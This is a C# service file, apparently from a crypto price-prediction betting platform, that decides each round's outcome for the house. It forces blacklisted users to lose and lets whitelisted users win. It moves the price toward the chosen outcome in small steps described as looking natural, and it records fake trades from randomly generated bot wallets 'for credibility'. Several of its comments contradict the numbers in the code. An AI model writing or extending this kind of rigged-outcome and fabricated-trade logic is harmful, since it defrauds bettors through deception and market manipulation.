using TradeFinanceBackend.Models;
using TradeFinanceBackend.Data;
using Microsoft.EntityFrameworkCore;
using System.Globalization;

namespace TradeFinanceBackend.Services
{
    public class AdvancedBotTradingService : IAdvancedBotTradingService
    {
        private readonly IServiceProvider _serviceProvider;
        private readonly ILogger<AdvancedBotTradingService> _logger;
        private readonly IPMCoinPriceService _priceService;
        private readonly decimal _totalSupply = 100_000_000m; // 100M PM coins
        private const decimal ACCEPTABLE_WHITELIST_LOSS = -10000m; // Max loss for a "pity win"
        private static List<string>? _botWallets;
        private static readonly object _lockObject = new object();

        public AdvancedBotTradingService(
            IServiceProvider serviceProvider,
            ILogger<AdvancedBotTradingService> logger,
            IPMCoinPriceService priceService)
        {
            _serviceProvider = serviceProvider;
            _logger = logger;
            _priceService = priceService;
        }

        // MAIN DECISION ENGINE - Quyết định outcome cho round
        public async Task<string> DecideRoundOutcomeAsync(ProfitAnalysis? analysis)
        {
            // --- FOR TESTING ---
            // This block disables all profit-optimization and manipulation logic and forces
            // the outcome to be UP for easy testing. To re-enable normal logic,
            // simply comment out or remove this block.
            // _logger.LogWarning("⚠️⚠️⚠️ TESTING MODE ACTIVE: Manipulation logic is bypassed. Forcing UP outcome for testing.");
            // return BetDirection.Up;
            
            try
            {
                if (analysis == null)
                {
                    _logger.LogWarning("DecideRoundOutcomeAsync received a null analysis object. Defaulting to PROFIT_OPTIMIZED.");
                    return "PROFIT_OPTIMIZED"; // Default fallback
                }

                // Lấy ISmartContractService để đọc dữ liệu on-chain
                using var scope = _serviceProvider.CreateScope();
                var smartContractService = scope.ServiceProvider.GetRequiredService<ISmartContractService>();
                var contractStats = await smartContractService.GetContractStats();
                var currentOnChainProfit = decimal.Parse(contractStats.CurrentDailyProfit, CultureInfo.InvariantCulture);

                // --- Pre-computation ---
                var mostProfitableOutcome = analysis.UpWinProfit > analysis.DownWinProfit ? BetDirection.Up : BetDirection.Down;
                var targetAchieved = await IsTargetAchievedAsync();
                var context = scope.ServiceProvider.GetRequiredService<TradeFinanceDbContext>();
                var bets = await context.ActiveBets
                    .Where(b => b.SessionId == analysis.SessionId)
                    .ToListAsync();

                var blacklistBias = await CheckBlacklistUsersAsync(bets);
                var whitelistBias = await CheckWhitelistUsersAsync(bets);

                // --- Decision Logic ---

                // PRIORITY 1: Blacklist bias (strongest bias)
                if (!string.IsNullOrEmpty(blacklistBias))
                {
                    _logger.LogWarning("🚫 Blacklist BIAS: Biasing outcome to {Bias} to make user lose.", blacklistBias);
                    return blacklistBias;
                }

                // PRIORITY 2: Whitelist bias (if acceptable loss)
                if (!string.IsNullOrEmpty(whitelistBias))
                {
                    decimal lossFromPityWin = (whitelistBias == BetDirection.Up)
                        ? analysis.UpWinProfit
                        : analysis.DownWinProfit;

                    // FIX: The primary condition for a pity win should be that the loss is acceptable.
                    // The old rule preventing on-chain profit from ever going negative was too strict
                    // and caused users to lose indefinitely, defeating the purpose of the whitelist.
                    // We now allow a controlled loss to improve user experience.
                    if (lossFromPityWin >= ACCEPTABLE_WHITELIST_LOSS)
                    {
                        _logger.LogInformation("✅ Whitelist BIAS: Biasing outcome to {Bias} to make user win. Profit impact: {Profit}",
                            whitelistBias, lossFromPityWin.ToString("F2"));
                        return whitelistBias;
                    }
                    _logger.LogWarning("⚠️ Whitelist IGNORED (loss too high): Making user win would cause an unacceptable loss of {Loss}. Prioritizing profit. Recommended: {Recommended}",
                        Math.Abs(lossFromPityWin).ToString("F2"), mostProfitableOutcome);
                    // Fall through to profit optimization
                }

                // PRIORITY 2.5: HARD RULE (RELAXED) - Ngăn chặn lợi nhuận on-chain trở nên âm quá mức.
                // Cho phép một khoản lỗ nhỏ để cải thiện trải nghiệm người dùng, nhưng giới hạn khoản lỗ đó.
                var treasuryBalance = decimal.Parse(contractStats.TreasuryBalance, CultureInfo.InvariantCulture);
                var acceptableOnChainLoss = -(treasuryBalance * 0.01m); // Giới hạn lỗ ở mức -1% tổng kho bạc

                bool isUpAllowed = (currentOnChainProfit + analysis.UpWinProfit) >= acceptableOnChainLoss;
                bool isDownAllowed = (currentOnChainProfit + analysis.DownWinProfit) >= acceptableOnChainLoss;

                // Nếu chỉ có một hướng được phép, ép theo hướng đó.
                if (isUpAllowed && !isDownAllowed)
                {
                    _logger.LogWarning("🚨 HARD RULE: Kết quả DOWN sẽ gây lỗ quá mức. Ép kết quả UP.");
                    return BetDirection.Up;
                }

                if (!isUpAllowed && isDownAllowed)
                {
                    _logger.LogWarning("🚨 HARD RULE: Kết quả UP sẽ gây lỗ quá mức. Ép kết quả DOWN.");
                    return BetDirection.Down;
                }

                // Nếu cả hai hướng đều được phép (hoặc cả hai đều bị cấm), tiếp tục logic tối ưu hóa lợi nhuận thông thường.

                // PRIORITY 3: If daily target NOT met, prioritize profit.
                if (!targetAchieved)
                {
                    _logger.LogInformation("🎯 Target not met. Prioritizing profit. Recommended: {Outcome} (UP: {UpProfit}, DOWN: {DownProfit})",
                        mostProfitableOutcome, analysis.UpWinProfit.ToString("F2"), analysis.DownWinProfit.ToString("F2"));
                    return mostProfitableOutcome;
                }

                // PRIORITY 4: Target is met, no special cases. Optimize for profit.
                _logger.LogInformation("💰 Target met. No special cases. Optimizing profit. Recommended: {Outcome}", mostProfitableOutcome);
                return mostProfitableOutcome;
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "Error deciding round outcome for session {SessionId}", analysis?.SessionId);
                return "PROFIT_OPTIMIZED"; // Default fallback
            }
        }

        // Execute targeted manipulation để đạt outcome mong muốn
        public async Task<bool> ExecuteTargetedManipulationAsync(string targetOutcome, decimal currentPrice, int timeRemaining, decimal startPrice)
        {
            try
            {
                using var scope = _serviceProvider.CreateScope();
                var context = scope.ServiceProvider.GetRequiredService<TradeFinanceDbContext>();
                var botWallets = await GenerateBotWalletsAsync();
                var random = new Random();

                decimal targetPrice;
                const decimal buffer = 0.00001m; // Một khoảng đệm nhỏ để đảm bảo giá vượt qua ngưỡng

                if (targetOutcome == BetDirection.Up)
                {
                    // Nếu giá hiện tại đã thắng (hoặc hòa), chỉ cần đẩy nhẹ lên để đảm bảo.
                    // Nếu không, mục tiêu là vượt qua giá bắt đầu một chút.
                    targetPrice = currentPrice >= startPrice ? currentPrice + buffer : startPrice + buffer;
                }
                else // targetOutcome là DOWN
                {
                    // Tương tự cho trường hợp giá xuống
                    targetPrice = currentPrice <= startPrice ? currentPrice - buffer : startPrice - buffer;
                }
                targetPrice = Math.Max(0.01m, targetPrice); // Đảm bảo giá không bị âm

                var priceGap = targetPrice - currentPrice;

                // Nếu chênh lệch không đáng kể, bỏ qua thao túng
                if (Math.Abs(priceGap) < 0.000001m)
                {
                    _logger.LogInformation("Manipulation skipped: Price is already on the correct side.");
                    return true;
                }

                // Chia nhỏ việc thao túng thành nhiều bước để trông tự nhiên
                var numTransactions = Math.Max(1, (int)(timeRemaining / 0.75f)); // Mục tiêu: 1 giao dịch mỗi 0.75s
                numTransactions = Math.Min(numTransactions, 5); // Giới hạn tối đa 5 giao dịch
                var priceStep = priceGap / numTransactions;
                var delayBetweenTransactions = (timeRemaining * 1000) / numTransactions;

                _logger.LogInformation("Subtle manipulation started: Pushing price towards {TargetPrice} from {CurrentPrice} over {NumTransactions} transactions.",
                    targetPrice.ToString("F6"), currentPrice.ToString("F6"), numTransactions);

                var stepPrice = currentPrice;
                for (int i = 0; i < numTransactions; i++)
                {
                    var previousStepPrice = stepPrice;
                    stepPrice += priceStep;

                    // Cập nhật giá chính của hệ thống
                    await _priceService.UpdatePMCoinPriceAsync(stepPrice, PMCoinPriceSource.GameBot, $"Target manipulation: {targetOutcome} (step {i + 1}/{numTransactions})");

                    // Ghi lại log giao dịch của bot để tăng tính minh bạch
                    var bot = botWallets[random.Next(botWallets.Count)];
                    var action = priceStep > 0 ? BotAction.Buy : BotAction.Sell;
                    var amount = (decimal)(random.Next(50_000, 500_000)); // Lượng giao dịch chỉ để hiển thị, không ảnh hưởng giá

                    LogBotTransactionHistory(context, bot, action, amount, stepPrice, previousStepPrice, $"Target manipulation: {targetOutcome} (step {i + 1}/{numTransactions})");

                    if (i < numTransactions - 1) await Task.Delay(delayBetweenTransactions);
                }
                await context.SaveChangesAsync();

                _logger.LogInformation("Subtle manipulation completed for outcome: {Outcome}", targetOutcome);
                return true;
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "Error executing targeted manipulation");
                return false;
            }
        }

        private void LogBotTransactionHistory(TradeFinanceDbContext context, string botAddress, string action, decimal amount, decimal newPrice, decimal oldPrice, string? reason = null, Guid? sessionId = null)
        {
            var priceImpact = newPrice - oldPrice;
            var changePercent = oldPrice > 0 ? (priceImpact / oldPrice) * 100 : 0;

            var historyRecord = new PMCoinPriceHistory
            {
                Price = newPrice,
                PreviousPrice = oldPrice,
                Change = priceImpact,
                ChangePercent = changePercent,
                Source = PMCoinPriceSource.GameBot,
                Reason = reason,
                Timestamp = DateTime.UtcNow,
                Date = DateTime.UtcNow.Date,
                Hour = DateTime.UtcNow.Hour,
                BotWalletAddress = botAddress,
                BotAction = action,
                BotAmount = amount,
                PriceImpact = priceImpact,
                SessionId = sessionId
            };
            context.PMCoinPriceHistories.Add(historyRecord);
            // Note: SaveChangesAsync will be called by the caller method (ExecuteTargetedManipulationAsync)
        }

        // Execute random bot trading (when no manipulation needed) - 10 bots
        public async Task<bool> ExecuteRandomBotTradingAsync()
        {
            try
            {
                var botWallets = await GenerateBotWalletsAsync();
                var random = new Random();

                // Select 10 random bots from 100
                var activeBots = botWallets.OrderBy(x => random.Next()).Take(10).ToList();

                foreach (var bot in activeBots)
                {
                    var action = random.Next(2) == 0 ? BotAction.Buy : BotAction.Sell;
                    var amount = random.Next(100_000, 2_000_000); // 100K-2M PM (0.1-2% impact)

                    await ExecuteBotTransactionAsync(bot, action, amount, "Random trading");
                    await Task.Delay(400); // 400ms delay between bots
                }

                // Reduced logging - only log errors or important events
                return true;
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "Error executing random bot trading");
                return false;
            }
        }

        // Execute single bot trading (optimized for 15s intervals)
        public async Task<bool> ExecuteSingleBotTradingAsync()
        {
            try
            {
                // CRITICAL FIX: Prevent random trading during session settlement.
                // This avoids a race condition where random market noise could override
                // the targeted manipulation meant to secure profit.
                using (var scope = _serviceProvider.CreateScope())
                {
                    var sessionService = scope.ServiceProvider.GetRequiredService<IGameSessionManagementService>();
                    var currentSession = await sessionService.GetCurrentSessionAsync();
                    if (currentSession != null && currentSession.Status == GameSessionStatus.Settling) {
                        _logger.LogDebug("Skipping random bot trade because a session is currently settling.");
                        return false; // Do not execute random trade
                    }
                }

                var currentPrice = await _priceService.GetPMCoinPriceAsync();

                // 🚨 EMERGENCY PRICE RESET: Chỉ reset nếu giá > $5 (max range)
                if (currentPrice > 5m)
                {
                    await _priceService.UpdatePMCoinPriceAsync(5m, PMCoinPriceSource.GameBot, "Emergency price reset - above max range");
                    _logger.LogWarning($"🚨 EMERGENCY RESET! Price ${currentPrice:F2} → $5.00 (max range)");
                    return true;
                }

                // 🚨 EMERGENCY PRICE RESET: Chỉ reset nếu giá < $1 (min range)
                if (currentPrice < 1m)
                {
                    await _priceService.UpdatePMCoinPriceAsync(1m, PMCoinPriceSource.GameBot, "Emergency price reset - below min range");
                    _logger.LogWarning($"🚨 EMERGENCY RESET! Price ${currentPrice:F2} → $1.00 (min range)");
                    return true;
                }

                var botWallets = await GenerateBotWalletsAsync();
                var random = new Random();

                // Select 1 random bot from 100
                var bot = botWallets[random.Next(botWallets.Count)];

                string action;

                // --- NEW PROFIT-AWARE LOGIC ---
                var targetAchieved = await IsTargetAchievedAsync();
                string? profitableDirection = null;

                if (!targetAchieved)
                {
                    using var scope = _serviceProvider.CreateScope();
                    var sessionService = scope.ServiceProvider.GetRequiredService<IGameSessionManagementService>();
                    var currentSession = await sessionService.GetCurrentSessionAsync();
                    if (currentSession != null)
                    {
                        var analysisService = scope.ServiceProvider.GetRequiredService<IRealTimeBetAnalysisService>();
                        var analysis = await analysisService.GetProfitAnalysisAsync(currentSession.Id);
                        if (analysis != null && (analysis.TotalUpBets > 0 || analysis.TotalDownBets > 0))
                        {
                            profitableDirection = analysis.UpWinProfit > analysis.DownWinProfit ? BetDirection.Up : BetDirection.Down;
                        }
                    }
                }

                // Determine bot action based on profit awareness
                if (profitableDirection != null)
                {
                    // Heavily bias towards the profitable direction to avoid "forbidden zones"
                    // 85% chance to trade in the profitable direction, 15% against.
                    action = random.NextDouble() < 0.85
                        ? (profitableDirection == BetDirection.Up ? BotAction.Buy : BotAction.Sell)
                        : (profitableDirection == BetDirection.Up ? BotAction.Sell : BotAction.Buy);
                    _logger.LogDebug("Profit-aware trade: Biasing towards {Direction}. Chosen action: {Action}", profitableDirection, action);
                }
                else
                {
                    // Fallback to original logic if target is met or no analysis available
                    if (currentPrice > 4m)
                    {
                        action = random.NextDouble() < 0.7 ? BotAction.Sell : BotAction.Buy;
                    }
                    else if (currentPrice < 1.5m)
                    {
                        action = random.NextDouble() < 0.7 ? BotAction.Buy : BotAction.Sell;
                    }
                    else
                    {
                        action = random.NextDouble() < 0.5 ? BotAction.Buy : BotAction.Sell;
                    }
                    _logger.LogDebug("Standard random trade. Chosen action: {Action}", action);
                }

                // 🎲 RANDOM VOLATILITY: 2% chance big move (±1-2%), 98% small move (±0.05-0.5%)
                decimal priceChange;
                bool isBigMove = random.NextDouble() < 0.09; 

                if (isBigMove)
                {
                    // Big move: ±1-2%
                    decimal bigPercent = (decimal)(random.NextDouble() * 1 + 4); // 1-2%
                    priceChange = action == BotAction.Buy ? bigPercent : -bigPercent;
                    _logger.LogInformation($"🚀 BIG MOVE! {action} {bigPercent:F1}%");
                }
                else
                {
                    // Small move: ±0.05-0.5%
                    decimal smallPercent = (decimal)(random.NextDouble() * 0.45 + 0.5); // 0.05-5%
                    priceChange = action == BotAction.Buy ? smallPercent : -smallPercent;
                }

                // Calculate new price
                decimal newPrice = currentPrice * (1 + priceChange / 100);

                // Ensure price stays in $1-5 range
                newPrice = Math.Max(1m, Math.Min(5m, newPrice));

                var amount = random.Next(50_000, 500_000); // 50K-500K PM (giảm impact)

                await ExecuteBotTransactionAsync(bot, action, amount, "Single bot trading");

                // Update price after transaction
                await _priceService.UpdatePMCoinPriceAsync(newPrice, PMCoinPriceSource.GameBot, $"Bot {action} - {priceChange:F2}%");

                return true;
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "Error executing single bot trading");
                return false;
            }
        }

        // Generate 100 fake bot wallet addresses
        public Task<List<string>> GenerateBotWalletsAsync(int count = 100)
        {
            if (_botWallets != null && _botWallets.Count >= count)
                return Task.FromResult(_botWallets);

            lock (_lockObject)
            {
                if (_botWallets == null)
                {
                    _botWallets = new List<string>();
                    var random = new Random();

                    for (int i = 0; i < count; i++)
                    {
                        var bytes = new byte[20];
                        random.NextBytes(bytes);
                        var wallet = "0x" + Convert.ToHexString(bytes).ToLower();
                        _botWallets.Add(wallet);
                    }
                }
            }

            return Task.FromResult(_botWallets);
        }

        // Execute single bot transaction - return PMCoinPriceHistory instead of deprecated BotTransactionHistory
        public async Task<PMCoinPriceHistory> ExecuteBotTransactionAsync(string botAddress, string action, decimal amount, string? reason = null, Guid? sessionId = null)
        {
            try
            {
                var currentPrice = await _priceService.GetPMCoinPriceAsync();
                var newPrice = CalculateNewPrice(action, amount, currentPrice);
                var priceImpact = newPrice - currentPrice;

                // Update PMCoinPrices để frontend thấy được giá mới
                await _priceService.UpdatePMCoinPriceAsync(newPrice, PMCoinPriceSource.GameBot, reason);

                // Save bot transaction for credibility
                using var scope = _serviceProvider.CreateScope();
                var context = scope.ServiceProvider.GetRequiredService<TradeFinanceDbContext>();

                // Lưu vào PMCoinPriceHistory thay vì BotTransactionHistories
                var oldPrice = await _priceService.GetPMCoinPriceAsync();
                var change = newPrice - oldPrice;
                var changePercent = oldPrice > 0 ? (change / oldPrice) * 100 : 0;

                var priceHistory = new PMCoinPriceHistory
                {
                    Price = newPrice,
                    PreviousPrice = oldPrice,
                    Change = change,
                    ChangePercent = changePercent,
                    Source = "GAME_BOT",
                    Reason = reason,
                    Timestamp = DateTime.UtcNow,
                    Date = DateTime.UtcNow.Date,
                    Hour = DateTime.UtcNow.Hour,
                    // Bot transaction details
                    BotWalletAddress = botAddress,
                    BotAction = action,
                    BotAmount = amount,
                    PriceImpact = priceImpact,
                    SessionId = sessionId,
                    CreatedAt = DateTime.UtcNow,
                    UpdatedAt = DateTime.UtcNow
                };

                context.PMCoinPriceHistories.Add(priceHistory);
                await context.SaveChangesAsync();

                // Return the actual PMCoinPriceHistory record instead of creating deprecated BotTransactionHistory
                return priceHistory;
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "Error executing bot transaction");
                throw;
            }
        }

        // Helper methods
        private decimal CalculateNewPrice(string action, decimal amount, decimal currentPrice)
        {
            var impact = amount / _totalSupply;
            decimal newPrice;

            // 🎯 PRICE STABILIZATION: Nếu giá quá cao (>$50), force sell pressure
            if (currentPrice > 50m && action == BotAction.Buy)
            {
                // Convert buy to sell để đẩy giá xuống
                action = BotAction.Sell;
                _logger.LogWarning($"💥 PRICE TOO HIGH! Converting BUY to SELL at ${currentPrice:F2}");
            }

            // 🎯 SKIP SMALL TRADES: 50% chance skip để giảm frequency
            var random = new Random();
            if (random.NextDouble() < 0.5) // 50% chance skip
            {
                return currentPrice; // No price change
            }

            // 🎯 GIẢM BIẾN ĐỘNG: 0.5% cơ hội có biến động LỚN (±1-2%)
            var isBigMove = random.NextDouble() < 0.005; // 0.5% chance (giảm từ 2%)

            if (isBigMove)
            {
                var bigImpact = (decimal)(random.NextDouble() * 0.01 + 0.01); // 1-2% (giảm từ 2-5%)
                if (action == BotAction.Buy)
                {
                    newPrice = currentPrice * (1 + bigImpact);
                    _logger.LogInformation($"🚀 BIG PUMP! +{bigImpact:P1} from ${currentPrice:F3} to ${newPrice:F3}");
                }
                else
                {
                    newPrice = currentPrice * (1 - bigImpact);
                    _logger.LogInformation($"📉 BIG DUMP! -{bigImpact:P1} from ${currentPrice:F3} to ${newPrice:F3}");
                }
            }
            else
            {
                // Biến động bình thường - GIẢM range xuống 0.01-0.1%
                var normalImpact = (decimal)(random.NextDouble() * 0.0009 + 0.0001); // 0.01-0.1% (giảm từ 0.1-1%)
                if (action == BotAction.Buy)
                {
                    newPrice = currentPrice * (1 + normalImpact);
                }
                else
                {
                    newPrice = currentPrice * (1 - normalImpact);
                }
            }

            // 🎯 XÓA CHEAT BONUS: Không thêm bias để tránh pump liên tục
            // Removed cheat bonus to prevent continuous pumping

            // QUAN TRỌNG: Đảm bảo giá không bao giờ âm và tối thiểu $0.50
            newPrice = Math.Max(0.50m, newPrice); // Giá tối thiểu $0.50

            // 🎯 ROUND TO 2 DECIMAL PLACES để tránh database overflow
            return Math.Round(newPrice, 2);
        }

        private decimal RandomizeAmount(decimal baseAmount)
        {
            var random = new Random();
            var variance = 0.2m; // ±20% variance
            var multiplier = 1 + ((decimal)random.NextDouble() - 0.5m) * 2 * variance;
            return Math.Max(100_000m, baseAmount * multiplier);
        }

        private async Task<bool> IsTargetAchievedAsync()
        {
            try
            {
                using var scope = _serviceProvider.CreateScope();
                var context = scope.ServiceProvider.GetRequiredService<TradeFinanceDbContext>();

                var today = DateTime.UtcNow.Date;
                var target = await context.DailyTargetTrackings
                    .FirstOrDefaultAsync(t => t.Date.Date == today);

                return target?.IsTargetAchieved ?? false;
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "Error checking target achievement");
                return false;
            }
        }

        private async Task<string?> CheckBlacklistUsersAsync(List<ActiveBet> bets)
        {
            try
            {
                using var scope = _serviceProvider.CreateScope();
                var context = scope.ServiceProvider.GetRequiredService<TradeFinanceDbContext>();

                foreach (var bet in bets)
                {
                    var userStats = await context.UserGameStats
                        .FirstOrDefaultAsync(u => u.WalletAddress == bet.UserAddress);

                    if (userStats?.IsBlacklisted == true)
                    {
                        // Force this user lose
                        var forceOutcome = bet.Direction == BetDirection.Up ? BetDirection.Down : BetDirection.Up;
                        _logger.LogWarning("🚫 BLACKLIST MANIPULATION: User {Address} bet {Direction}, forcing {Outcome}",
                            bet.UserAddress, bet.Direction, forceOutcome);
                        return forceOutcome;
                    }
                }

                return null;
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "Error checking blacklisted users");
                return null;
            }
        }

        private async Task<string?> CheckWhitelistUsersAsync(List<ActiveBet> bets)
        {
            try
            {
                using var scope = _serviceProvider.CreateScope();
                var context = scope.ServiceProvider.GetRequiredService<TradeFinanceDbContext>();

                foreach (var bet in bets)
                {
                    var userStats = await context.UserGameStats
                        .FirstOrDefaultAsync(u => u.WalletAddress == bet.UserAddress);

                    if (userStats?.IsWhitelisted == true)
                    {
                        // Force this user win
                        _logger.LogInformation("✅ WHITELIST MANIPULATION: User {Address} bet {Direction}, ensuring WIN",
                            bet.UserAddress, bet.Direction);
                        return bet.Direction;
                    }
                }

                return null;
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "Error checking whitelisted users");
                return null;
            }
        }
    }
}
